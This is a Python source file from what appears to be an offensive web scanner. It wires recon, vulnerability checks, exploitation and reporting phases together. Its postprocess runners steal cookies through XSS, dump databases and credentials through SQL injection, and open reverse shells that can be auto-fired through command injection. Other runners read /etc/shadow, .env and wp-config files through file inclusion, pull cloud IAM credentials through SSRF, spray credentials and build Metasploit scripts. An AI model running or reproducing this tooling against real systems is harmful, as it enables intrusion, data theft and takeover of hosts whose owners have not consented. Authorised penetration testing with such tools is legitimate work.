"""
cyberm4fia-scanner – Phase-module runner functions.

Each ``_run_*`` function is called by the ``PHASE_MODULES`` registry defined
in ``core.module_registry``.  They are separated here to keep the registry
module concise and focused on metadata / specs.
"""

import os
from utils.request import ScanExceptions


# ── Discovery / Recon runners ───────────────────────────────────────────────

def _run_cloud_storage(state):
    from modules.cloud_enum import scan_cloud_storage

    return scan_cloud_storage(state["url"], delay=state["delay"])


def _run_recon(state):
    from modules.recon import run_recon

    state["recon_data"] = run_recon(
        state["url"],
        deep=bool(state["options"].get("recon")),
    )
    return []


def _run_osint(state):
    import os
    from utils.shodan_lookup import scan_osint

    shodan_key = os.environ.get("SHODAN_API_KEY", "")
    state["osint_data"] = scan_osint(state["url"], shodan_api_key=shodan_key or None, delay=state["delay"])
    return []


def _run_tech_intel(state):
    from modules.tech_detect import scan_technology
    from utils.colors import log_warning

    state["tech_results"] = scan_technology(state["url"], delay=state["delay"])
    
    # Store tech context globally in options so async modules can use it
    if "options" in state:
        state["options"]["target_context"] = state["tech_results"]

    try:
        from utils.cve_feed import enrich_with_cves

        state["cve_intel"] = enrich_with_cves(state["tech_results"])
    except ScanExceptions as exc:
        log_warning(f"CVE feed unavailable: {exc}")
        state["cve_intel"] = []

    return state["cve_intel"]


def _run_subdomain_takeover(state):
    from modules.subdomain_takeover import scan_subdomain_takeover

    return scan_subdomain_takeover(state["url"], delay=state["delay"])


def _run_api_scan(state):
    from modules.api_scanner import scan_api

    return scan_api(
        state["url"],
        delay=state["delay"],
        spec_path=state["options"].get("api_spec") or None,
    )


def _run_subdomain_scan(state):
    from modules.recon import scan_subdomains

    scan_subdomains(state["target_host"])
    return []


def _run_cors(state):
    from modules.cors import scan_cors

    return scan_cors(state["url"])


def _run_header_inject(state):
    from modules.header_inject import scan_header_inject

    return scan_header_inject(state["url"], state["delay"])


# ── Discovery expansion runners ─────────────────────────────────────────────

def _run_fuzzer_discovery(state):
    from modules.endpoint_fuzzer import scan_fuzzer_async
    from core.module_registry import canonicalize_scan_urls

    endpoints = scan_fuzzer_async(
        state["url"],
        state["wordlist_file"],
        threads=state["options"].get("threads", 50),
        delay=state["delay"],
    )
    if endpoints:
        state["urls_to_scan"].extend(
            [
                endpoint["url"]
                for endpoint in endpoints
                if endpoint["status"] in [200, 301, 302, 307, 308]
            ]
        )
        state["urls_to_scan"] = canonicalize_scan_urls(state["urls_to_scan"])
    return []


def _run_headless_discovery(state):
    from modules.dynamic_crawler import run_dynamic_spider
    from utils.colors import log_info, log_success
    from core.module_registry import canonicalize_scan_urls

    log_info("Using dynamic Playwright crawler for SPA...")
    crawl_result = run_dynamic_spider(state["url"], delay=state["delay"])

    found_links = crawl_result.get("links", [])
    state["urls_to_scan"] = canonicalize_scan_urls(
        state.get("urls_to_scan", [state["url"]]) + found_links
    )
    state["crawled_forms"] = crawl_result.get("forms", [])

    endpoints = crawl_result.get("endpoints", [])
    if endpoints:
        log_success(f"Discovered {len(endpoints)} background API endpoints")
        for method, endpoint_url in endpoints:
            if method.upper() == "GET":
                state["urls_to_scan"].append(endpoint_url)

    state["urls_to_scan"] = canonicalize_scan_urls(state["urls_to_scan"])[:30]
    return []


def _run_crawl_discovery(state):
    from modules.crawler import crawl_site
    from core.module_registry import canonicalize_scan_urls

    if state["options"].get("headless"):
        return []

    crawl_result = crawl_site(state["url"], max_pages=30)
    if isinstance(crawl_result, dict):
        state["urls_to_scan"] = canonicalize_scan_urls(
            crawl_result.get("urls", [state["url"]])
        )
        state["crawled_forms"] = crawl_result.get("forms", [])
    else:
        state["urls_to_scan"] = canonicalize_scan_urls(crawl_result)
    return []


# ── Page hook runners ────────────────────────────────────────────────────────

def _run_passive_hook(state):
    from modules.passive import scan_passive

    return scan_passive(state["scan_url"], response=state["response"])


def _run_secrets_hook(state):
    from modules.secrets_scanner import scan_secrets

    return scan_secrets(state["scan_url"], state["response"].text)


def _run_csrf_hook(state):
    from modules.csrf import scan_csrf

    return scan_csrf(state["scan_url"], state["forms"], state["delay"])


# ── Host-level hook dedup (CSP/HSTS are per-host, not per-URL) ───────────────
_csp_checked_hosts: set = set()
_hsts_checked_hosts: set = set()


def _run_csp_bypass_hook(state):
    from urllib.parse import urlparse
    from modules.csp_bypass import scan_csp_bypass

    host = urlparse(state["scan_url"]).netloc
    if host in _csp_checked_hosts:
        return []  # already reported for this host
    _csp_checked_hosts.add(host)
    return scan_csp_bypass(state["scan_url"], response=state["response"])


def _run_cookie_hsts_hook(state):
    from urllib.parse import urlparse
    from modules.cookie_hsts_audit import scan_cookie_hsts

    host = urlparse(state["scan_url"]).netloc
    if host in _hsts_checked_hosts:
        return []  # already reported for this host
    _hsts_checked_hosts.add(host)
    return scan_cookie_hsts(state["scan_url"], response=state["response"])


# ── Result processor runners ────────────────────────────────────────────────

def _run_xss_postprocess(state):
    from modules.xss_exploit import run_xss_exploit, run_xss_exploit_interactive
    from modules.browser_exploit import run_browser_xss_exploit, PLAYWRIGHT_AVAILABLE
    from utils.colors import Colors, log_info, log_error
    from utils.loot_manager import LootManager

    options = state.get("options", {})
    xss_vulns = state.get("xss_vulns", [])
    if not xss_vulns or not options.get("exploit"):
        return []

    log_info(f"Found {len(xss_vulns)} XSS vulns. Generating exploit payloads...")
    exploit_results = run_xss_exploit(xss_vulns, suppress_output=True)

    # Auto-save stolen cookies if any (from server interactions)
    loot = LootManager(state.get("scan_dir", "/tmp"))
    if exploit_results:
        for result in exploit_results:
            stolen = result.get("stolen_data", [])
            if stolen:
                loot.save_cookies(stolen)

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] XSS Exploit Options:\n"
        f"  1) Interactive Server (wait for victims to click)\n"
        f"  2) Headless Browser (auto-execute payload in-process)\n"
        f"  3) Skip"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice [1/2/3]:", "3").strip()

    if choice == "1":
        run_xss_exploit_interactive(xss_vulns)
    elif choice == "2":
        if not PLAYWRIGHT_AVAILABLE:
            log_error("Playwright not installed. Skipping headless exploit.")
            return []
            
        for vuln in xss_vulns:
            # Re-generate exploits to grab an exploit_url
            res = run_xss_exploit([vuln], suppress_output=True)
            if res and res[0].get("exploits"):
                # Grab the first URL-based exploit (typically param-based GET)
                for exp in res[0]["exploits"]:
                    url = exp.get("exploit_url")
                    if url:
                        p_res = run_browser_xss_exploit(vuln, url)
                        if p_res:
                            # Save cookies to LootManager
                            cookies = p_res.get("cookies", [])
                            if cookies:
                                # Convert Playwright cookie format slightly if needed
                                formatted = [{"cookie": f"{c['name']}={c['value']}", "source_ip": "playwright_headless"} for c in cookies]
                                loot.save_cookies(formatted)
                        break

    return []


def _run_csrf_exploit(state):
    from modules.browser_exploit import auto_exploit_csrf
    from utils.colors import Colors, log_info

    options = state.get("options", {})
    csrf_vulns = state.get("csrf_vulns", [])
    if not csrf_vulns or not options.get("exploit"):
        return []

    log_info(f"Found {len(csrf_vulns)} CSRF vulns.")
    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] Generate CSRF PoC Exploits? (y/N)"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice:", "N").lower()
    
    if choice == "y":
        for vuln in csrf_vulns:
            auto_exploit_csrf(vuln, state.get("forms", []))
            # (Note: robust CSRF exploitation often requires logging into the target. 
            # In a fully automated setting, we generate PoCs instead of running them headlessly
            # unless we have session credentials.)
            log_info(f"CSRF PoC would be generated here for: {vuln.get('url')}")
    
    return []


def _run_sqli_postprocess(state):
    from modules.sqli import scan_blind_sqli
    from modules.sqli_exploit import run_sqli_exploit
    from utils.colors import Colors, log_info, log_success, log_warning
    from utils.loot_manager import LootManager

    options = state.get("options", {})
    sqli_vulns = state.get("sqli_vulns", [])
    if not sqli_vulns or not options.get("exploit"):
        return []

    loot = LootManager(state.get("scan_dir", "/tmp"))

    if sqli_vulns:
        log_info(f"Found {len(sqli_vulns)} SQLi vulns. Attempting exploit...")
        for vuln in sqli_vulns:
            if "exploit_data" not in vuln:
                exploit_data = run_sqli_exploit(vuln)
                if exploit_data:
                    vuln["exploit_data"] = exploit_data
                    log_success("Exploitation successful! Data added to report.")

                    # Auto-save loot
                    db_name = exploit_data.get("database", "unknown")
                    tables = exploit_data.get("tables", [])
                    if tables:
                        loot.save_schema_info(db_name, tables)
                    for tbl, tbl_data in exploit_data.get("data", {}).items():
                        rows = tbl_data.get("rows", [])
                        cols = tbl_data.get("columns", [])
                        if rows:
                            loot.save_sqli_dump(
                                db_name, tbl, cols, rows,
                                blind=exploit_data.get("blind", False),
                            )
                            # If it looks like credentials, save separately
                            if any("pass" in c.lower() for c in cols):
                                loot.save_credentials(f"sqli_{tbl}", rows)

    extracted_data = any(v.get("exploit_data", {}).get("database") for v in sqli_vulns)
    if sqli_vulns and extracted_data:
        log_info(
            "Union-based SQLi successfully extracted data — skipping Blind SQLi (redundant)"
        )
        loot.summary()
        return []

    if sqli_vulns:
        log_warning(
            "Union SQLi found but data extraction failed. Falling back to Blind SQLi..."
        )

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] Run Blind SQLi? "
        f"(slow, time-based) (y/N)"
        f"{Colors.END}"
    )
    blind_choice = state["prompt_input"]("Choice:", "N").lower()
    if blind_choice != "y":
        return []

    log_info("Running Time-Based Blind SQLi checks...")
    blind_vulns = scan_blind_sqli(state["scan_url"], state["forms"], state["delay"])
    if blind_vulns:
        log_info(f"Found {len(blind_vulns)} Blind SQLi vulns. Attempting exploit...")
        for vuln in blind_vulns:
            if "exploit_data" not in vuln:
                exploit_data = run_sqli_exploit(vuln)
                if exploit_data:
                    vuln["exploit_data"] = exploit_data
                    log_success("Blind Exploitation successful! Data added to report.")

    loot.summary()
    return blind_vulns


def _run_cmdi_postprocess(state):
    from modules.cmdi_shell import InteractiveShell
    from utils.colors import Colors, log_info
    from utils.revshell import auto_generate_for_vuln, print_shells, get_local_ip
    from utils.reverse_listener import start_reverse_listener

    options = state.get("options", {})
    cmdi_vulns = state.get("cmdi_vulns", [])
    if not cmdi_vulns or not options.get("exploit"):
        return []

    log_info(f"Found {len(cmdi_vulns)} Command Injection vulns.")
    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] CMDi Exploit Options:\n"
        f"  1) Interactive Pseudo-Shell\n"
        f"  2) Reverse Shell (catch TTY connection)\n"
        f"  3) Skip"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice [1/2/3]:", "3").strip()

    if choice == "1":
        shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
        shell.run()
    elif choice == "2":
        port = int(options.get("revshell_port", 4444))
        attacker_ip = get_local_ip()

        # Generate best-fit shell payloads
        shells = auto_generate_for_vuln(cmdi_vulns[0], ip=attacker_ip, port=port)
        if shells:
            print_shells(shells, max_display=3)

        # Start listener
        listener = start_reverse_listener(port=port, timeout=120)
        if listener:
            log_info(
                f"Listener ready. Inject the payload above into the target, "
                f"or press Ctrl+C to cancel."
            )

            # Use the interactive CMDi shell to fire the payload automatically
            print(
                f"\n{Colors.BOLD}{Colors.CYAN}"
                f"[?] Auto-fire top payload via CMDi injection? (y/N)"
                f"{Colors.END}"
            )
            auto = state["prompt_input"]("Choice:", "N").lower()
            if auto == "y" and shells:
                fire_shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
                fire_shell.execute(shells[0]["command"])
                log_info("Payload sent! Waiting for connection …")

            if listener.wait_for_connection(timeout=120):
                listener.interact()
            listener.stop()

    return []


def _run_autopwn_postprocess(state):
    from utils.autopwn import generate_msf_resource, generate_nuclei_command
    from utils.colors import Colors

    options = state.get("options", {})
    if not options.get("exploit"):
        return []

    all_vulns = state.get("all_vulns", [])
    if not all_vulns:
        return []

    target = state.get("url", "")
    scan_dir = state.get("scan_dir", "/tmp")
    lhost = options.get("msf_lhost")
    lport = int(options.get("msf_lport", 4444))

    # Generate MSF resource script
    rc_path = generate_msf_resource(
        all_vulns, target, lhost=lhost, lport=lport, output_dir=scan_dir
    )

    # Generate Nuclei command
    tech_results = state.get("tech_results")
    nuclei_cmd = generate_nuclei_command(target, tech_results=tech_results, vulns=all_vulns)

    if rc_path or nuclei_cmd:
        print(
            f"\n{Colors.BOLD}{Colors.CYAN}"
            f"[*] Auto-Pwn artifacts generated in {scan_dir}"
            f"{Colors.END}"
        )

    return []


def _run_lfi_postprocess(state):
    """Auto-exploit confirmed LFI vulns: read sensitive files, save via LootManager."""
    from utils.colors import Colors, log_info, log_success, log_warning
    from utils.loot_manager import LootManager
    from utils.request import smart_request

    options = state.get("options", {})
    if not options.get("exploit"):
        return []

    lfi_vulns = [v for v in state.get("all_vulns", []) if "LFI" in v.get("type", "")]
    if not lfi_vulns:
        return []

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] {len(lfi_vulns)} LFI vuln(s) found. Auto-read sensitive files? (y/N)"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice:", "N").lower()
    if choice != "y":
        return []

    scan_dir = state.get("scan_dir", "/tmp")
    loot = LootManager(scan_dir)

    # Files to try reading via confirmed LFI
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "../../../../.env",
        "../../../../wp-config.php",
        "/proc/self/environ",
        "/etc/hosts",
        "../../../../config/database.yml",
    ]

    for vuln in lfi_vulns:
        url = vuln.get("url", "")
        param = vuln.get("param", "")

        if not url or not param:
            continue

        log_info(f"LFI exploit on {param}@{url[:60]}...")

        for target_file in sensitive_files:
            try:
                # Build the exploit payload using the same traversal pattern
                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [target_file]
                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                test_url = urlunparse(parsed._replace(query=urlencode(flat)))

                resp = smart_request("get", test_url, delay=0.5)
                if resp and resp.status_code == 200:
                    body = resp.text
                    # Check if file content is actually present
                    if target_file == "/etc/passwd" and "root:" in body:
                        loot.save_file_download("/etc/passwd", body)
                        log_success(f"  📄 /etc/passwd extracted!")
                    elif ".env" in target_file and ("DB_PASSWORD" in body or "APP_KEY" in body):
                        loot.save_file_download(".env", body)
                        log_success(f"  📄 .env file extracted!")
                    elif "wp-config" in target_file and "DB_NAME" in body:
                        loot.save_file_download("wp-config.php", body)
                        log_success(f"  📄 wp-config.php extracted!")
                    elif "root:" in body or "DB_" in body or "define(" in body:
                        basename = target_file.split("/")[-1] or "unknown"
                        loot.save_file_download(basename, body)
                        log_success(f"  📄 {target_file} extracted!")
            except Exception as e:
                log_warning(f"  LFI read failed for {target_file}: {e}")

    loot.summary()
    return []


def _run_ssrf_postprocess(state):
    """Auto-exploit confirmed SSRF vulns: probe cloud metadata endpoints."""
    from utils.colors import Colors, log_info, log_success, log_warning
    from utils.loot_manager import LootManager
    from utils.request import smart_request

    options = state.get("options", {})
    if not options.get("exploit"):
        return []

    ssrf_vulns = [v for v in state.get("all_vulns", []) if "SSRF" in v.get("type", "")]
    if not ssrf_vulns:
        return []

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] {len(ssrf_vulns)} SSRF vuln(s) found. Probe cloud metadata? (y/N)"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice:", "N").lower()
    if choice != "y":
        return []

    scan_dir = state.get("scan_dir", "/tmp")
    loot = LootManager(scan_dir)

    # Cloud metadata endpoints to probe via SSRF
    metadata_targets = [
        ("AWS", "http://169.254.169.254/latest/meta-data/"),
        ("AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS Token", "http://169.254.169.254/latest/api/token"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
        ("Internal", "http://127.0.0.1:80/"),
        ("Internal:8080", "http://127.0.0.1:8080/"),
    ]

    for vuln in ssrf_vulns:
        url = vuln.get("url", "")
        param = vuln.get("param", "")
        if not url or not param:
            continue

        log_info(f"SSRF cloud metadata probe on {param}@{url[:60]}...")

        for cloud_name, metadata_url in metadata_targets:
            try:
                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [metadata_url]
                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                test_url = urlunparse(parsed._replace(query=urlencode(flat)))

                resp = smart_request("get", test_url, delay=0.5)
                if resp and resp.status_code == 200 and len(resp.text) > 20:
                    # Check for cloud-specific content
                    body = resp.text
                    if any(kw in body.lower() for kw in [
                        "ami-id", "instance-id", "iam", "security-credentials",
                        "computeMetadata", "metadata", "droplet_id",
                    ]):
                        loot.save_file_download(f"ssrf_{cloud_name.lower()}_metadata.txt", body)
                        log_success(f"  ☁️ {cloud_name} metadata extracted!")
            except Exception as e:
                log_warning(f"  SSRF probe failed for {cloud_name}: {e}")

    loot.summary()
    return []


# ── Post-scan runners ───────────────────────────────────────────────────────

def _run_open_redirect(state):
    from modules.open_redirect import scan_open_redirect

    findings = []
    for scan_url in state["urls_to_scan"]:
        findings.extend(scan_open_redirect(scan_url, state["delay"]))
    return findings


def _run_credential_spray(state):
    from modules.spray import scan_spray

    open_ports = state.get("recon_data", {}).get("open_ports", [])
    return scan_spray(state["target_host"], open_ports=open_ports)


def _run_email_harvest(state):
    from modules.email_harvest import scan_email_harvest

    scan_email_harvest(state["url"], state["delay"])
    return []


def _run_wordlist_generation(state):
    from utils.wordlist_gen import generate_wordlist

    output_file = os.path.join(state["scan_dir"], "wordlist.txt")
    generate_wordlist(
        state["url"], depth=2, output_file=output_file, delay=state["delay"]
    )
    return []


def _run_jwt_scan(state):
    from modules.jwt_attack import scan_jwt

    return scan_jwt(state["url"], state["delay"], cookie=state["options"].get("cookie"))


def _run_race_condition(state):
    from modules.race_condition import scan_race_condition

    return scan_race_condition(
        state["url"],
        forms=state.get("crawled_forms", []),
        delay=state["delay"],
        cookie=state["options"].get("cookie"),
    )


def _run_smuggling(state):
    from modules.smuggling import scan_smuggling

    return scan_smuggling(state["url"], state["delay"])


def _run_proto_pollution(state):
    from modules.proto_pollution import scan_proto_pollution

    return scan_proto_pollution(state["url"], delay=state["delay"])


def _run_deserialization(state):
    from modules.deserialization import scan_deserialization

    return scan_deserialization(state["url"], state["delay"])


def _run_business_logic(state):
    from modules.business_logic import scan_business_logic

    return scan_business_logic(
        state["url"],
        forms=state.get("crawled_forms", []),
        delay=state["delay"],
    )


def _run_chain_analysis(state):
    from utils.vuln_chain import analyze_chains

    if state.get("all_vulns"):
        analyze_chains(state["all_vulns"])
    return []


# ── Result cleanup / analysis runners ────────────────────────────────────────

def _run_deduplicate_results(state):
    from utils.finding import deduplicate_findings

    state["all_vulns"] = deduplicate_findings(state.get("all_vulns", []))
    return []


def _run_ai_analysis(state):
    from utils.ai import (
        analyze_vulnerability,
        detect_false_positives,
        generate_remediation,
        generate_scan_summary,
        get_ai,
    )
    from utils.colors import console, log_info, log_success

    findings = state.get("all_vulns", [])
    if not findings:
        return []

    ai = get_ai()
    if not ai.available:
        return []

    findings = detect_false_positives(ai, findings)
    state["all_vulns"] = findings

    if findings:
        log_info("AI analyzing vulnerabilities...")
        for vuln in findings:
            analysis = analyze_vulnerability(ai, vuln)
            if analysis:
                vuln["ai_analysis"] = analysis

    remediations = generate_remediation(ai, findings)
    state["ai_remediations"] = remediations
    if remediations:
        log_success(f"AI generated {len(remediations)} remediation guide(s)")

    stats_factory = state.get("report_stats_factory")
    summary_stats = (
        stats_factory(len(findings))
        if stats_factory
        else {
            "requests": len(findings),
            "vulns": len(findings),
            "waf": 0,
        }
    )

    summary = generate_scan_summary(
        ai,
        findings,
        state["url"],
        summary_stats,
    )
    state["ai_summary"] = summary
    if summary:
        console.print("\n[bold cyan]═══ AI Executive Summary ═══[/bold cyan]")
        console.print(summary)
        console.print("[bold cyan]════════════════════════════[/bold cyan]\n")

    return []


# ── Reporting runners ────────────────────────────────────────────────────────

def _run_scan_summary(state):
    summary_printer = state.get("summary_printer")
    if summary_printer:
        stats_factory = state.get("summary_stats_factory")
        stats = (
            stats_factory(len(state.get("all_vulns", []))) if stats_factory else None
        )
        summary_printer(
            state.get("all_vulns", []),
            recon_data=state.get("recon_data"),
            stats=stats,
        )
    return []


def _run_html_report(state):
    from modules.report import generate_html_report

    stats_factory = state.get("summary_stats_factory")
    stats = (
        stats_factory(state.get("finding_count", len(state["all_vulns"])))
        if stats_factory
        else None
    )
    generate_html_report(
        state["all_vulns"],
        state["url"],
        state["mode"],
        state["scan_dir"],
        stats=stats,
    )
    return []


def _run_payload_report(state):
    from modules.report import generate_payload_report

    generate_payload_report(state["scan_dir"], state["url"], state["all_vulns"])
    return []


def _run_markdown_report(state):
    from modules.report import generate_markdown_report

    stats_factory = state.get("summary_stats_factory")
    stats = (
        stats_factory(state.get("finding_count", len(state["all_vulns"])))
        if stats_factory
        else None
    )
    generate_markdown_report(
        state["all_vulns"],
        state["url"],
        state["mode"],
        state["scan_dir"],
        stats=stats,
    )
    return []


def _run_poc_generation(state):
    from modules.poc_generator import generate_pocs

    generate_pocs(state["all_vulns"], state["scan_dir"])
    return []


def _run_normalize_findings(state):
    from utils.finding import build_scan_artifacts

    artifacts = build_scan_artifacts(state.get("all_vulns", []))
    state["scan_artifacts"] = artifacts
    state["observations"] = artifacts["observations"]
    state["attack_paths"] = artifacts["attack_paths"]
    state["normalized_findings"] = artifacts["findings"]
    state["finding_count"] = len(state["normalized_findings"])
    return []


def _run_json_report(state):
    from modules.report import generate_json_report

    if not state.get("options", {}).get("json_output"):
        return []

    generate_json_report(
        state["all_vulns"],
        state["url"],
        state["mode"],
        state["report_stats_factory"](
            state.get("finding_count", len(state["all_vulns"]))
        ),
        state["scan_dir"],
        state.get("scan_artifacts"),
    )
    return []


def _run_sarif_report(state):
    from core.output import save_sarif

    save_sarif(state["all_vulns"], state["scan_dir"])
    return []


def _run_findings_json(state):
    from core.output import save_findings_json

    if not state.get("options", {}).get("json_output"):
        return []

    save_findings_json(
        state["all_vulns"],
        state["scan_dir"],
        state["url"],
        state["mode"],
        state["report_stats_factory"](
            state.get("finding_count", len(state["all_vulns"]))
        ),
        state.get("scan_artifacts"),
    )
    return []


def _run_severity_summary(state):
    from core.output import print_severity_summary

    print_severity_summary(state["all_vulns"])
    return []
